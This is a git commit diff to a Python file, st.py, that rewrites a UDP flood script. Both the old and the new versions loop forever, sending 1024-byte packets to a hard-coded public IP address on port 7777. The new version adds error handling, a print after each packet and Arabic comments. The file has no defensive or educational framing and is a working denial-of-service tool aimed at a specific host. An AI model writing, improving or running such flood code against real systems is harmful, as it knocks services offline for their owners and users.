55563a4d393433242ed84ec3434f8121ff492037
MAGIC HOSTING <112265944+HiloDevnn@users.noreply.github.com>
2024-04-14 23:56:02 +0100

    Update st.py

--- st.py
+++ st.py
@@ -1,11 +1,18 @@
 import socket
 
-target_ip = "164.92.234.227"
-target_port = 7777
+target_ip = '164.92.234.227'
+target_port = 7777  # أو أي منفذ آخر يمكنك اختياره
 
-def udp_flood(target_ip, target_port):
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(b"A"*1024, (target_ip, target_port))
+# إعداد الحزمة UDP المزيفة
+udp_payload = b'\x41' * 1024  # هنا يتم إنشاء حزمة مليئة بالبيانات المزيفة (مثلاً، 1024 بايت)
 
-udp_flood(target_ip, target_port)
+# إرسال الحزم
+while True:
+    try:
+        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udp_socket.sendto(udp_payload, (target_ip, target_port))
+        print("Sent UDP packet to {}:{}".format(target_ip, target_port))
+    except Exception as e:
+        print("An error occurred:", e)
+    finally:
+        udp_socket.close()
